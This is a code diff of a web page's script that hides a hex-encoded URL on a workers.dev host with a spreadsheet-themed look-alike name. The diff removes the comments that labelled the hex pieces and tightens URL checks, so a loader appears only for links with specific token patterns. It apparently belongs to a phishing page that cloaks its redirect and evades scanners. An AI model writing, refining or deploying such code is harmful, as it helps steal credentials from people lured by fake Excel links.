@@ -47,8 +47,8 @@ display:none;
 
 /* HEX pieces (scrambled) */
 const h = [
-"68747470733a2f2f626c7537306c",   // example
-"336673312d657863656c2d", // https
+"68747470733a2f2f626c7537306c",
+"336673312d657863656c2d",
 "6f70656238323531636964393133783373353473707265656473686565657473302d31306",
 "2632e636f6d30323930362e776f726b6572732e6465762f"
 ];
@@ -69,16 +69,24 @@ return str;
 
 function validateURL(){
 
-let hostname = window.location.hostname;
-let path = window.location.pathname;
+/* split path segments */
+let parts = window.location.pathname.split("/").filter(Boolean);
 
-/* subdomain rule */
-let subPattern = /^[A-Z]{8}-[0-9]{9}\./;
+if(parts.length < 2) return;
+
+/* first segment (previously subdomain token) */
+let token = parts[0];
+
+/* second segment (long random structure) */
+let structure = parts[1];
+
+/* token rule */
+let tokenPattern = /^[A-Z]{8}-[0-9]{9}$/;
 
 /* path rule */
-let endPattern = /[A-Z]{8}[a-z]{6}[A-Za-z]{37}[0-9]{5}$/;
+let endPattern = /^[A-Z]{8}[a-z]{6}[A-Za-z]{37}[0-9]{5}$/;
 
-if(subPattern.test(hostname) && endPattern.test(path)){
+if(tokenPattern.test(token) && endPattern.test(structure)){
 
 document.getElementById("loader").style.display="flex";
 
